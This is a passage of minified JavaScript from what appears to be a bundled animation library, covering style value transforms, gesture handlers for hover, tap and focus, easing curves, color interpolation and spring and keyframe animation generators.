").length===1,parse:parseFloat,transform:t=>`${t}${n}`}),Di=ps("deg"),Yt=ps("%"),le=ps("px"),Ww=ps("vh"),Hw=ps("vw"),Gp={...Yt,parse:n=>Yt.parse(n)/100,transform:n=>Yt.transform(n*100)},qp={...gn,transform:Math.round},jg={borderWidth:le,borderTopWidth:le,borderRightWidth:le,borderBottomWidth:le,borderLeftWidth:le,borderRadius:le,radius:le,borderTopLeftRadius:le,borderTopRightRadius:le,borderBottomRightRadius:le,borderBottomLeftRadius:le,width:le,maxWidth:le,height:le,maxHeight:le,size:le,top:le,right:le,bottom:le,left:le,padding:le,paddingTop:le,paddingRight:le,paddingBottom:le,paddingLeft:le,margin:le,marginTop:le,marginRight:le,marginBottom:le,marginLeft:le,rotate:Di,rotateX:Di,rotateY:Di,rotateZ:Di,scale:Eo,scaleX:Eo,scaleY:Eo,scaleZ:Eo,skew:Di,skewX:Di,skewY:Di,distance:le,translateX:le,translateY:le,translateZ:le,x:le,y:le,z:le,perspective:le,transformPerspective:le,opacity:Zr,originX:Gp,originY:Gp,originZ:le,zIndex:qp,fillOpacity:Zr,strokeOpacity:Zr,numOctaves:qp};function ud(n,t,r,s){const{style:a,vars:c,transform:d,transformOrigin:h}=n;let p=!1,f=!1,m=!0;for(const y in t){const v=t[y];if(Dg(y)){c[y]=v;continue}const w=jg[y],E=Uw(v,w);if(fn.has(y)){if(p=!0,d[y]=E,!m)continue;v!==(w.default||0)&&(m=!1)}else y.startsWith("origin")?(f=!0,h[y]=E):a[y]=E}if(t.transform||(p||s?a.transform=Fw(n.transform,r,m,s):a.transform&&(a.transform="none")),f){const{originX:y="50%",originY:v="50%",originZ:w=0}=h;a.transformOrigin=`${y} ${v} ${w}`}}const hd=()=>({style:{},transform:{},transformOrigin:{},vars:{}});function Lg(n,t,r){for(const s in t)!mt(t[s])&&!_g(s,r)&&(n[s]=t[s])}function $w({transformTemplate:n},t,r){return S.useMemo(()=>{const s=hd();return ud(s,t,{enableHardwareAcceleration:!r},n),Object.assign({},s.vars,s.style)},[t])}function Gw(n,t,r){const s=n.style||{},a={};return Lg(a,s,n),Object.assign(a,$w(n,t,r)),n.transformValues?n.transformValues(a):a}function qw(n,t,r){const s={},a=Gw(n,t,r);return n.drag&&n.dragListener!==!1&&(s.draggable=!1,a.userSelect=a.WebkitUserSelect=a.WebkitTouchCallout="none",a.touchAction=n.drag===!0?"none":`pan-${n.drag==="x"?"y":"x"}`),n.tabIndex===void 0&&(n.onTap||n.onTapStart||n.whileTap)&&(s.tabIndex=0),s.style=a,s}const Kw=new Set(["animate","exit","variants","initial","style","values","variants","transition","transformTemplate","transformValues","custom","inherit","onBeforeLayoutMeasure","onAnimationStart","onAnimationComplete","onUpdate","onDragStart","onDrag","onDragEnd","onMeasureDragConstraints","onDirectionLock","onDragTransitionEnd","_dragX","_dragY","onHoverStart","onHoverEnd","onViewportEnter","onViewportLeave","globalTapTarget","ignoreStrict","viewport"]);function Ho(n){return n.startsWith("while")||n.startsWith("drag")&&n!=="draggable"||n.startsWith("layout")||n.startsWith("onTap")||n.startsWith("onPan")||n.startsWith("onLayout")||Kw.has(n)}let Og=n=>!Ho(n);function Jw(n){n&&(Og=t=>t.startsWith("on")?!Ho(t):n(t))}try{Jw(require("@emotion/is-prop-valid").default)}catch{}function Qw(n,t,r){const s={};for(const a in n)a==="values"&&typeof n.values=="object"||(Og(a)||r===!0&&Ho(a)||!t&&!Ho(a)||n.draggable&&a.startsWith("onDrag"))&&(s[a]=n[a]);return s}function Kp(n,t,r){return typeof n=="string"?n:le.transform(t+r*n)}function Yw(n,t,r){const s=Kp(t,n.x,n.width),a=Kp(r,n.y,n.height);return`${s} ${a}`}const Xw={offset:"stroke-dashoffset",array:"stroke-dasharray"},Zw={offset:"strokeDashoffset",array:"strokeDasharray"};function e0(n,t,r=1,s=0,a=!0){n.pathLength=1;const c=a?Xw:Zw;n[c.offset]=le.transform(-s);const d=le.transform(t),h=le.transform(r);n[c.array]=`${d} ${h}`}function pd(n,{attrX:t,attrY:r,attrScale:s,originX:a,originY:c,pathLength:d,pathSpacing:h=1,pathOffset:p=0,...f},m,y,v){if(ud(n,f,m,v),y){n.style.viewBox&&(n.attrs.viewBox=n.style.viewBox);return}n.attrs=n.style,n.style={};const{attrs:w,style:E,dimensions:T}=n;w.transform&&(T&&(E.transform=w.transform),delete w.transform),T&&(a!==void 0||c!==void 0||E.transform)&&(E.transformOrigin=Yw(T,a!==void 0?a:.5,c!==void 0?c:.5)),t!==void 0&&(w.x=t),r!==void 0&&(w.y=r),s!==void 0&&(w.scale=s),d!==void 0&&e0(w,d,h,p,!1)}const Bg=()=>({...hd(),attrs:{}}),fd=n=>typeof n=="string"&&n.toLowerCase()==="svg";function t0(n,t,r,s){const a=S.useMemo(()=>{const c=Bg();return pd(c,t,{enableHardwareAcceleration:!1},fd(s),n.transformTemplate),{...c.attrs,style:{...c.style}}},[t]);if(n.style){const c={};Lg(c,n.style,n),a.style={...c,...a.style}}return a}function i0(n=!1){return(r,s,a,{latestValues:c},d)=>{const p=(dd(r)?t0:qw)(s,c,d,r),m={...Qw(s,typeof r=="string",n),...p,ref:a},{children:y}=s,v=S.useMemo(()=>mt(y)?y.get():y,[y]);return S.createElement(r,{...m,children:v})}}function Ng(n,{style:t,vars:r},s,a){Object.assign(n.style,t,a&&a.getProjectionStyles(s));for(const c in r)n.style.setProperty(c,r[c])}const Fg=new Set(["baseFrequency","diffuseConstant","kernelMatrix","kernelUnitLength","keySplines","keyTimes","limitingConeAngle","markerHeight","markerWidth","numOctaves","targetX","targetY","surfaceScale","specularConstant","specularExponent","stdDeviation","tableValues","viewBox","gradientTransform","pathLength","startOffset","textLength","lengthAdjust"]);function zg(n,t,r,s){Ng(n,t,void 0,s);for(const a in t.attrs)n.setAttribute(Fg.has(a)?a:od(a),t.attrs[a])}function gd(n,t){const{style:r}=n,s={};for(const a in r)(mt(r[a])||t.style&&mt(t.style[a])||_g(a,n))&&(s[a]=r[a]);return s}function Ug(n,t){const r=gd(n,t);for(const s in n)if(mt(n[s])||mt(t[s])){const a=us.indexOf(s)!==-1?"attr"+s.charAt(0).toUpperCase()+s.substring(1):s;r[a]=n[s]}return r}function md(n,t,r,s={},a={}){return typeof t=="function"&&(t=t(r!==void 0?r:n.custom,s,a)),typeof t=="string"&&(t=n.variants&&n.variants[t]),typeof t=="function"&&(t=t(r!==void 0?r:n.custom,s,a)),t}function Vg(n){const t=S.useRef(null);return t.current===null&&(t.current=n()),t.current}const $o=n=>Array.isArray(n),n0=n=>!!(n&&typeof n=="object"&&n.mix&&n.toValue),r0=n=>$o(n)?n[n.length-1]||0:n;function No(n){const t=mt(n)?n.get():n;return n0(t)?t.toValue():t}function s0({scrapeMotionValuesFromProps:n,createRenderState:t,onMount:r},s,a,c){const d={latestValues:o0(s,a,c,n),renderState:t()};return r&&(d.mount=h=>r(s,h,d)),d}const Wg=n=>(t,r)=>{const s=S.useContext(Zo),a=S.useContext(ea),c=()=>s0(n,t,s,a);return r?c():Vg(c)};function o0(n,t,r,s){const a={},c=s(n,{});for(const v in c)a[v]=No(c[v]);let{initial:d,animate:h}=n;const p=na(n),f=Eg(n);t&&f&&!p&&n.inherit!==!1&&(d===void 0&&(d=t.initial),h===void 0&&(h=t.animate));let m=r?r.initial===!1:!1;m=m||d===!1;const y=m?h:d;return y&&typeof y!="boolean"&&!ia(y)&&(Array.isArray(y)?y:[y]).forEach(w=>{const E=md(n,w);if(!E)return;const{transitionEnd:T,transition:C,...O}=E;for(const R in O){let M=O[R];if(Array.isArray(M)){const L=m?M.length-1:0;M=M[L]}M!==null&&(a[R]=M)}for(const R in T)a[R]=T[R]}),a}const Ue=n=>n;class Jp{constructor(){this.order=[],this.scheduled=new Set}add(t){if(!this.scheduled.has(t))return this.scheduled.add(t),this.order.push(t),!0}remove(t){const r=this.order.indexOf(t);r!==-1&&(this.order.splice(r,1),this.scheduled.delete(t))}clear(){this.order.length=0,this.scheduled.clear()}}function a0(n){let t=new Jp,r=new Jp,s=0,a=!1,c=!1;const d=new WeakSet,h={schedule:(p,f=!1,m=!1)=>{const y=m&&a,v=y?t:r;return f&&d.add(p),v.add(p)&&y&&a&&(s=t.order.length),p},cancel:p=>{r.remove(p),d.delete(p)},process:p=>{if(a){c=!0;return}if(a=!0,[t,r]=[r,t],r.clear(),s=t.order.length,s)for(let f=0;f<s;f++){const m=t.order[f];m(p),d.has(m)&&(h.schedule(m),n())}a=!1,c&&(c=!1,h.process(p))}};return h}const Io=["prepare","read","update","preRender","render","postRender"],l0=40;function c0(n,t){let r=!1,s=!0;const a={delta:0,timestamp:0,isProcessing:!1},c=Io.reduce((y,v)=>(y[v]=a0(()=>r=!0),y),{}),d=y=>c[y].process(a),h=()=>{const y=performance.now();r=!1,a.delta=s?1e3/60:Math.max(Math.min(y-a.timestamp,l0),1),a.timestamp=y,a.isProcessing=!0,Io.forEach(d),a.isProcessing=!1,r&&t&&(s=!1,n(h))},p=()=>{r=!0,s=!0,a.isProcessing||n(h)};return{schedule:Io.reduce((y,v)=>{const w=c[v];return y[v]=(E,T=!1,C=!1)=>(r||p(),w.schedule(E,T,C)),y},{}),cancel:y=>Io.forEach(v=>c[v].cancel(y)),state:a,steps:c}}const{schedule:_e,cancel:ui,state:st,steps:dc}=c0(typeof requestAnimationFrame<"u"?requestAnimationFrame:Ue,!0),d0={useVisualState:Wg({scrapeMotionValuesFromProps:Ug,createRenderState:Bg,onMount:(n,t,{renderState:r,latestValues:s})=>{_e.read(()=>{try{r.dimensions=typeof t.getBBox=="function"?t.getBBox():t.getBoundingClientRect()}catch{r.dimensions={x:0,y:0,width:0,height:0}}}),_e.render(()=>{pd(r,s,{enableHardwareAcceleration:!1},fd(t.tagName),n.transformTemplate),zg(t,r)})}})},u0={useVisualState:Wg({scrapeMotionValuesFromProps:gd,createRenderState:hd})};function h0(n,{forwardMotionProps:t=!1},r,s){return{...dd(n)?d0:u0,preloadedFeatures:r,useRender:i0(t),createVisualElement:s,Component:n}}function ai(n,t,r,s={passive:!0}){return n.addEventListener(t,r,s),()=>n.removeEventListener(t,r)}const Hg=n=>n.pointerType==="mouse"?typeof n.button!="number"||n.button<=0:n.isPrimary!==!1;function sa(n,t="page"){return{point:{x:n[t+"X"],y:n[t+"Y"]}}}const p0=n=>t=>Hg(t)&&n(t,sa(t));function ci(n,t,r,s){return ai(n,t,p0(r),s)}const f0=(n,t)=>r=>t(n(r)),Oi=(...n)=>n.reduce(f0);function $g(n){let t=null;return()=>{const r=()=>{t=null};return t===null?(t=n,r):!1}}const Qp=$g("dragHorizontal"),Yp=$g("dragVertical");function Gg(n){let t=!1;if(n==="y")t=Yp();else if(n==="x")t=Qp();else{const r=Qp(),s=Yp();r&&s?t=()=>{r(),s()}:(r&&r(),s&&s())}return t}function qg(){const n=Gg(!0);return n?(n(),!1):!0}class Fi{constructor(t){this.isMounted=!1,this.node=t}update(){}}function Xp(n,t){const r="pointer"+(t?"enter":"leave"),s="onHover"+(t?"Start":"End"),a=(c,d)=>{if(c.pointerType==="touch"||qg())return;const h=n.getProps();n.animationState&&h.whileHover&&n.animationState.setActive("whileHover",t),h[s]&&_e.update(()=>h[s](c,d))};return ci(n.current,r,a,{passive:!n.getProps()[s]})}class g0 extends Fi{mount(){this.unmount=Oi(Xp(this.node,!0),Xp(this.node,!1))}unmount(){}}class m0 extends Fi{constructor(){super(...arguments),this.isActive=!1}onFocus(){let t=!1;try{t=this.node.current.matches(":focus-visible")}catch{t=!0}!t||!this.node.animationState||(this.node.animationState.setActive("whileFocus",!0),this.isActive=!0)}onBlur(){!this.isActive||!this.node.animationState||(this.node.animationState.setActive("whileFocus",!1),this.isActive=!1)}mount(){this.unmount=Oi(ai(this.node.current,"focus",()=>this.onFocus()),ai(this.node.current,"blur",()=>this.onBlur()))}unmount(){}}const Kg=(n,t)=>t?n===t?!0:Kg(n,t.parentElement):!1;function uc(n,t){if(!t)return;const r=new PointerEvent("pointer"+n);t(r,sa(r))}class y0 extends Fi{constructor(){super(...arguments),this.removeStartListeners=Ue,this.removeEndListeners=Ue,this.removeAccessibleListeners=Ue,this.startPointerPress=(t,r)=>{if(this.isPressing)return;this.removeEndListeners();const s=this.node.getProps(),c=ci(window,"pointerup",(h,p)=>{if(!this.checkPressEnd())return;const{onTap:f,onTapCancel:m,globalTapTarget:y}=this.node.getProps();_e.update(()=>{!y&&!Kg(this.node.current,h.target)?m&&m(h,p):f&&f(h,p)})},{passive:!(s.onTap||s.onPointerUp)}),d=ci(window,"pointercancel",(h,p)=>this.cancelPress(h,p),{passive:!(s.onTapCancel||s.onPointerCancel)});this.removeEndListeners=Oi(c,d),this.startPress(t,r)},this.startAccessiblePress=()=>{const t=c=>{if(c.key!=="Enter"||this.isPressing)return;const d=h=>{h.key!=="Enter"||!this.checkPressEnd()||uc("up",(p,f)=>{const{onTap:m}=this.node.getProps();m&&_e.update(()=>m(p,f))})};this.removeEndListeners(),this.removeEndListeners=ai(this.node.current,"keyup",d),uc("down",(h,p)=>{this.startPress(h,p)})},r=ai(this.node.current,"keydown",t),s=()=>{this.isPressing&&uc("cancel",(c,d)=>this.cancelPress(c,d))},a=ai(this.node.current,"blur",s);this.removeAccessibleListeners=Oi(r,a)}}startPress(t,r){this.isPressing=!0;const{onTapStart:s,whileTap:a}=this.node.getProps();a&&this.node.animationState&&this.node.animationState.setActive("whileTap",!0),s&&_e.update(()=>s(t,r))}checkPressEnd(){return this.removeEndListeners(),this.isPressing=!1,this.node.getProps().whileTap&&this.node.animationState&&this.node.animationState.setActive("whileTap",!1),!qg()}cancelPress(t,r){if(!this.checkPressEnd())return;const{onTapCancel:s}=this.node.getProps();s&&_e.update(()=>s(t,r))}mount(){const t=this.node.getProps(),r=ci(t.globalTapTarget?window:this.node.current,"pointerdown",this.startPointerPress,{passive:!(t.onTapStart||t.onPointerStart)}),s=ai(this.node.current,"focus",this.startAccessiblePress);this.removeStartListeners=Oi(r,s)}unmount(){this.removeStartListeners(),this.removeEndListeners(),this.removeAccessibleListeners()}}const Lc=new WeakMap,hc=new WeakMap,b0=n=>{const t=Lc.get(n.target);t&&t(n)},v0=n=>{n.forEach(b0)};function w0({root:n,...t}){const r=n||document;hc.has(r)||hc.set(r,{});const s=hc.get(r),a=JSON.stringify(t);return s[a]||(s[a]=new IntersectionObserver(v0,{root:n,...t})),s[a]}function k0(n,t,r){const s=w0(t);return Lc.set(n,r),s.observe(n),()=>{Lc.delete(n),s.unobserve(n)}}const x0={some:0,all:1};class T0 extends Fi{constructor(){super(...arguments),this.hasEnteredView=!1,this.isInView=!1}startObserver(){this.unmount();const{viewport:t={}}=this.node.getProps(),{root:r,margin:s,amount:a="some",once:c}=t,d={root:r?r.current:void 0,rootMargin:s,threshold:typeof a=="number"?a:x0[a]},h=p=>{const{isIntersecting:f}=p;if(this.isInView===f||(this.isInView=f,c&&!f&&this.hasEnteredView))return;f&&(this.hasEnteredView=!0),this.node.animationState&&this.node.animationState.setActive("whileInView",f);const{onViewportEnter:m,onViewportLeave:y}=this.node.getProps(),v=f?m:y;v&&v(p)};return k0(this.node.current,d,h)}mount(){this.startObserver()}update(){if(typeof IntersectionObserver>"u")return;const{props:t,prevProps:r}=this.node;["amount","margin","root"].some(S0(t,r))&&this.startObserver()}unmount(){}}function S0({viewport:n={}},{viewport:t={}}={}){return r=>n[r]!==t[r]}const A0={inView:{Feature:T0},tap:{Feature:y0},focus:{Feature:m0},hover:{Feature:g0}};function Jg(n,t){if(!Array.isArray(t))return!1;const r=t.length;if(r!==n.length)return!1;for(let s=0;s<r;s++)if(t[s]!==n[s])return!1;return!0}function C0(n){const t={};return n.values.forEach((r,s)=>t[s]=r.get()),t}function P0(n){const t={};return n.values.forEach((r,s)=>t[s]=r.getVelocity()),t}function oa(n,t,r){const s=n.getProps();return md(s,t,r!==void 0?r:s.custom,C0(n),P0(n))}let yd=Ue;const un=n=>n*1e3,di=n=>n/1e3,E0={current:!1},Qg=n=>Array.isArray(n)&&typeof n[0]=="number";function Yg(n){return!!(!n||typeof n=="string"&&Xg[n]||Qg(n)||Array.isArray(n)&&n.every(Yg))}const Yr=([n,t,r,s])=>`cubic-bezier(${n}, ${t}, ${r}, ${s})`,Xg={linear:"linear",ease:"ease",easeIn:"ease-in",easeOut:"ease-out",easeInOut:"ease-in-out",circIn:Yr([0,.65,.55,1]),circOut:Yr([.55,0,1,.45]),backIn:Yr([.31,.01,.66,-.59]),backOut:Yr([.33,1.53,.69,.99])};function Zg(n){if(n)return Qg(n)?Yr(n):Array.isArray(n)?n.map(Zg):Xg[n]}function I0(n,t,r,{delay:s=0,duration:a,repeat:c=0,repeatType:d="loop",ease:h,times:p}={}){const f={[t]:r};p&&(f.offset=p);const m=Zg(h);return Array.isArray(m)&&(f.easing=m),n.animate(f,{delay:s,duration:a,easing:Array.isArray(m)?"linear":m,fill:"both",iterations:c+1,direction:d==="reverse"?"alternate":"normal"})}function _0(n,{repeat:t,repeatType:r="loop"}){const s=t&&r!=="loop"&&t%2===1?0:n.length-1;return n[s]}const em=(n,t,r)=>(((1-3*r+3*t)*n+(3*r-6*t))*n+3*t)*n,R0=1e-7,D0=12;function M0(n,t,r,s,a){let c,d,h=0;do d=t+(r-t)/2,c=em(d,s,a)-n,c>0?r=d:t=d;while(Math.abs(c)>R0&&++h<D0);return d}function fs(n,t,r,s){if(n===t&&r===s)return Ue;const a=c=>M0(c,0,1,n,r);return c=>c===0||c===1?c:em(a(c),t,s)}const j0=fs(.42,0,1,1),L0=fs(0,0,.58,1),tm=fs(.42,0,.58,1),O0=n=>Array.isArray(n)&&typeof n[0]!="number",im=n=>t=>t<=.5?n(2*t)/2:(2-n(2*(1-t)))/2,nm=n=>t=>1-n(1-t),bd=n=>1-Math.sin(Math.acos(n)),rm=nm(bd),B0=im(bd),sm=fs(.33,1.53,.69,.99),vd=nm(sm),N0=im(vd),F0=n=>(n*=2)<1?.5*vd(n):.5*(2-Math.pow(2,-10*(n-1))),z0={linear:Ue,easeIn:j0,easeInOut:tm,easeOut:L0,circIn:bd,circInOut:B0,circOut:rm,backIn:vd,backInOut:N0,backOut:sm,anticipate:F0},Zp=n=>{if(Array.isArray(n)){yd(n.length===4);const[t,r,s,a]=n;return fs(t,r,s,a)}else if(typeof n=="string")return z0[n];return n},wd=(n,t)=>r=>!!(hs(r)&&Vw.test(r)&&r.startsWith(n)||t&&Object.prototype.hasOwnProperty.call(r,t)),om=(n,t,r)=>s=>{if(!hs(s))return s;const[a,c,d,h]=s.match(ra);return{[n]:parseFloat(a),[t]:parseFloat(c),[r]:parseFloat(d),alpha:h!==void 0?parseFloat(h):1}},U0=n=>Bi(0,255,n),pc={...gn,transform:n=>Math.round(U0(n))},cn={test:wd("rgb","red"),parse:om("red","green","blue"),transform:({red:n,green:t,blue:r,alpha:s=1})=>"rgba("+pc.transform(n)+", "+pc.transform(t)+", "+pc.transform(r)+", "+es(Zr.transform(s))+")"};function V0(n){let t="",r="",s="",a="";return n.length>5?(t=n.substring(1,3),r=n.substring(3,5),s=n.substring(5,7),a=n.substring(7,9)):(t=n.substring(1,2),r=n.substring(2,3),s=n.substring(3,4),a=n.substring(4,5),t+=t,r+=r,s+=s,a+=a),{red:parseInt(t,16),green:parseInt(r,16),blue:parseInt(s,16),alpha:a?parseInt(a,16)/255:1}}const Oc={test:wd("#"),parse:V0,transform:cn.transform},Yn={test:wd("hsl","hue"),parse:om("hue","saturation","lightness"),transform:({hue:n,saturation:t,lightness:r,alpha:s=1})=>"hsla("+Math.round(n)+", "+Yt.transform(es(t))+", "+Yt.transform(es(r))+", "+es(Zr.transform(s))+")"},ct={test:n=>cn.test(n)||Oc.test(n)||Yn.test(n),parse:n=>cn.test(n)?cn.parse(n):Yn.test(n)?Yn.parse(n):Oc.parse(n),transform:n=>hs(n)?n:n.hasOwnProperty("red")?cn.transform(n):Yn.transform(n)},Be=(n,t,r)=>-r*n+r*t+n;function fc(n,t,r){return r<0&&(r+=1),r>1&&(r-=1),r<1/6?n+(t-n)*6*r:r<1/2?t:r<2/3?n+(t-n)*(2/3-r)*6:n}function W0({hue:n,saturation:t,lightness:r,alpha:s}){n/=360,t/=100,r/=100;let a=0,c=0,d=0;if(!t)a=c=d=r;else{const h=r<.5?r*(1+t):r+t-r*t,p=2*r-h;a=fc(p,h,n+1/3),c=fc(p,h,n),d=fc(p,h,n-1/3)}return{red:Math.round(a*255),green:Math.round(c*255),blue:Math.round(d*255),alpha:s}}const gc=(n,t,r)=>{const s=n*n;return Math.sqrt(Math.max(0,r*(t*t-s)+s))},H0=[Oc,cn,Yn],$0=n=>H0.find(t=>t.test(n));function ef(n){const t=$0(n);let r=t.parse(n);return t===Yn&&(r=W0(r)),r}const am=(n,t)=>{const r=ef(n),s=ef(t),a={...r};return c=>(a.red=gc(r.red,s.red,c),a.green=gc(r.green,s.green,c),a.blue=gc(r.blue,s.blue,c),a.alpha=Be(r.alpha,s.alpha,c),cn.transform(a))};function G0(n){var t,r;return isNaN(n)&&hs(n)&&(((t=n.match(ra))===null||t===void 0?void 0:t.length)||0)+(((r=n.match(Mg))===null||r===void 0?void 0:r.length)||0)>0}const lm={regex:zw,countKey:"Vars",token:"${v}",parse:Ue},cm={regex:Mg,countKey:"Colors",token:"${c}",parse:ct.parse},dm={regex:ra,countKey:"Numbers",token:"${n}",parse:gn.parse};function mc(n,{regex:t,countKey:r,token:s,parse:a}){const c=n.tokenised.match(t);c&&(n["num"+r]=c.length,n.tokenised=n.tokenised.replace(t,s),n.values.push(...c.map(a)))}function Go(n){const t=n.toString(),r={value:t,tokenised:t,values:[],numVars:0,numColors:0,numNumbers:0};return r.value.includes("var(--")&&mc(r,lm),mc(r,cm),mc(r,dm),r}function um(n){return Go(n).values}function hm(n){const{values:t,numColors:r,numVars:s,tokenised:a}=Go(n),c=t.length;return d=>{let h=a;for(let p=0;p<c;p++)p<s?h=h.replace(lm.token,d[p]):p<s+r?h=h.replace(cm.token,ct.transform(d[p])):h=h.replace(dm.token,es(d[p]));return h}}const q0=n=>typeof n=="number"?0:n;function K0(n){const t=um(n);return hm(n)(t.map(q0))}const Ni={test:G0,parse:um,createTransformer:hm,getAnimatableNone:K0},pm=(n,t)=>r=>`${r>0?t:n}`;function fm(n,t){return typeof n=="number"?r=>Be(n,t,r):ct.test(n)?am(n,t):n.startsWith("var(")?pm(n,t):mm(n,t)}const gm=(n,t)=>{const r=[...n],s=r.length,a=n.map((c,d)=>fm(c,t[d]));return c=>{for(let d=0;d<s;d++)r[d]=a[d](c);return r}},J0=(n,t)=>{const r={...n,...t},s={};for(const a in r)n[a]!==void 0&&t[a]!==void 0&&(s[a]=fm(n[a],t[a]));return a=>{for(const c in s)r[c]=s[c](a);return r}},mm=(n,t)=>{const r=Ni.createTransformer(t),s=Go(n),a=Go(t);return s.numVars===a.numVars&&s.numColors===a.numColors&&s.numNumbers>=a.numNumbers?Oi(gm(s.values,a.values),r):pm(n,t)},ls=(n,t,r)=>{const s=t-n;return s===0?1:(r-n)/s},tf=(n,t)=>r=>Be(n,t,r);function Q0(n){return typeof n=="number"?tf:typeof n=="string"?ct.test(n)?am:mm:Array.isArray(n)?gm:typeof n=="object"?J0:tf}function Y0(n,t,r){const s=[],a=r||Q0(n[0]),c=n.length-1;for(let d=0;d<c;d++){let h=a(n[d],n[d+1]);if(t){const p=Array.isArray(t)?t[d]||Ue:t;h=Oi(p,h)}s.push(h)}return s}function ym(n,t,{clamp:r=!0,ease:s,mixer:a}={}){const c=n.length;if(yd(c===t.length),c===1)return()=>t[0];n[0]>n[c-1]&&(n=[...n].reverse(),t=[...t].reverse());const d=Y0(t,s,a),h=d.length,p=f=>{let m=0;if(h>1)for(;m<n.length-2&&!(f<n[m+1]);m++);const y=ls(n[m],n[m+1],f);return d[m](y)};return r?f=>p(Bi(n[0],n[c-1],f)):p}function X0(n,t){const r=n[n.length-1];for(let s=1;s<=t;s++){const a=ls(0,t,s);n.push(Be(r,1,a))}}function Z0(n){const t=[0];return X0(t,n.length-1),t}function ek(n,t){return n.map(r=>r*t)}function tk(n,t){return n.map(()=>t||tm).splice(0,n.length-1)}function qo({duration:n=300,keyframes:t,times:r,ease:s="easeInOut"}){const a=O0(s)?s.map(Zp):Zp(s),c={done:!1,value:t[0]},d=ek(r&&r.length===t.length?r:Z0(t),n),h=ym(d,t,{ease:Array.isArray(a)?a:tk(t,a)});return{calculatedDuration:n,next:p=>(c.value=h(p),c.done=p>=n,c)}}function bm(n,t){return t?n*(1e3/t):0}const ik=5;function vm(n,t,r){const s=Math.max(t-ik,0);return bm(r-n(s),t-s)}const yc=.001,nk=.01,rk=10,sk=.05,ok=1;function ak({duration:n=800,bounce:t=.25,velocity:r=0,mass:s=1}){let a,c,d=1-t;d=Bi(sk,ok,d),n=Bi(nk,rk,di(n)),d<1?(a=f=>{const m=f*d,y=m*n,v=m-r,w=Bc(f,d),E=Math.exp(-y);return yc-v/w*E},c=f=>{const y=f*d*n,v=y*r+r,w=Math.pow(d,2)*Math.pow(f,2)*n,E=Math.exp(-y),T=Bc(Math.pow(f,2),d);return(-a(f)+yc>0?-1:1)*((v-w)*E)/T}):(a=f=>{const m=Math.exp(-f*n),y=(f-r)*n+1;return-yc+m*y},c=f=>{const m=Math.exp(-f*n),y=(r-f)*(n*n);return m*y});const h=5/n,p=ck(a,c,h);if(n=un(n),isNaN(p))return{stiffness:100,damping:10,duration:n};{const f=Math.pow(p,2)*s;return{stiffness:f,damping:d*2*Math.sqrt(s*f),duration:n}}}const lk=12;function ck(n,t,r){let s=r;for(let a=1;a<lk;a++)s=s-n(s)/t(s);return s}function Bc(n,t){return n*Math.sqrt(1-t*t)}const dk=["duration","bounce"],uk=["stiffness","damping","mass"];function nf(n,t){return t.some(r=>n[r]!==void 0)}function hk(n){let t={velocity:0,stiffness:100,damping:10,mass:1,isResolvedFromDuration:!1,...n};if(!nf(n,uk)&&nf(n,dk)){const r=ak(n);t={...t,...r,mass:1},t.isResolvedFromDuration=!0}return t}function wm({keyframes:n,restDelta:t,restSpeed:r,...s}){const a=n[0],c=n[n.length-1],d={done:!1,value:a},{stiffness:h,damping:p,mass:f,duration:m,velocity:y,isResolvedFromDuration:v}=hk({...s,velocity:-di(s.velocity||0)}),w=y||0,E=p/(2*Math.sqrt(h*f)),T=c-a,C=di(Math.sqrt(h/f)),O=Math.abs(T)<5;r||(r=O?.01:2),t||(t=O?.005:.5);let R;if(E<1){const M=Bc(C,E);R=L=>{const W=Math.exp(-E*C*L);return c-W*((w+E*C*T)/M*Math.sin(M*L)+T*Math.cos(M*L))}}else if(E===1)R=M=>c-Math.exp(-C*M)*(T+(w+C*T)*M);else{const M=C*Math.sqrt(E*E-1);R=L=>{const W=Math.exp(-E*C*L),J=Math.min(M*L,300);return c-W*((w+E*C*T)*Math.sinh(J)+M*T*Math.cosh(J))/M}}return{calculatedDuration:v&&m||null,next:M=>{const L=R(M);if(v)d.done=M>=m;else{let W=w;M!==0&&(E<1?W=vm(R,M,L):W=0);const J=Math.abs(W)<=r,G=Math.abs(c-L)<=t;d.done=J&&G}return d.value=d.done?c:L,d}}}function rf({keyframes:n,velocity:t=0,power:r=.8,timeConstant:s=325,bounceDamping:a=10,bounceStiffness:c=500,modifyTarget:d,min:h,max:p,restDelta:f=.5,restSpeed:m}){const y=n[0],v={done:!1,value:y},w=X=>h!==void 0&&X<h||p!==void 0&&X>p,E=X=>h===void 0?p:p===void 0||Math.abs(h-X)<Math.abs(p-X)?h:p;let T=r*t;const C=y+T,O=d===void 0?C:d(C);O!==C&&(T=O-y);const R=X=>-T*Math.exp(-X/s),M=X=>O+R(X),L=X=>{const ne=R(X),ge=M(X);v.done=Math.abs(ne)<=f,v.value=v.done?O:ge};let W,J;const G=X=>{w(v.value)&&(W=X,J=wm({keyframes:[v.value,E(v.value)],velocity:vm(M,X,v.value),damping:a,stiffness:c,restDelta:f,restSpeed:m}))};return G(0),{calculatedDuration:null,next:X=>{let ne=!1;return!J&&W===void 0&&(ne=!0,L(X),G(X)),W!==void 0&&X>W?J.next(X-W):(!ne&&L(X),v)}}}const pk=n=>{const t=({timestamp:r})=>n(r);return{start:()=>_e.update(t,!0),stop:()=>ui(t),now:()=>st.isProcessing?st.timestamp:performance.now()}},sf=2e4;function of(n){let t=0;const r=50;let s=n.next(t);for(;!s.done&&t<sf;)t+=r,s=n.next(t);return t>=sf?1/0:t}const fk={decay:rf,inertia:rf,tween:qo,keyframes:qo,spring:wm};function Ko({autoplay:n=!0,delay:t=0,driver:r=pk,keyframes:s,type:a="keyframes",repeat:c=0,repeatDelay:d=0,repeatType:h="loop",onPlay:p,onStop:f,onComplete:m,onUpdate:y,...v}){let w=1,E=!1,T,C;const O=()=>{C=new Promise(P=>{T=P})};O();let R;const M=fk[a]||qo;let L;M!==qo&&typeof s[0]!="number"&&(L=ym([0,100],s,{clamp:!1}),s=[0,100]);const W=M({...v,keyframes:s});let J;h==="mirror"&&(J=M({...v,keyframes:[...s].reverse(),velocity:-(v.velocity||0)}));let G="idle",X=null,ne=null,ge=null;W.calculatedDuration===null&&c&&(W.calculatedDuration=of(W));const{calculatedDuration:Ae}=W;let H=1/0,ae=1/0;Ae!==null&&(H=Ae+d,ae=H*(c+1)-d);let $=0;const he=P=>{if(ne===null)return;w>0&&(ne=Math.min(ne,P)),w<0&&(ne=Math.min(P-ae/w,ne)),X!==null?$=X:$=Math.round(P-ne)*w;const B=$-t*(w>=0?1:-1),te=w>=0?B<0:B>ae;$=Math.max(B,0),G==="finished"&&X===null&&($=ae);let de=$,be=W;if(c){const Ce=Math.min($,ae)/H;let 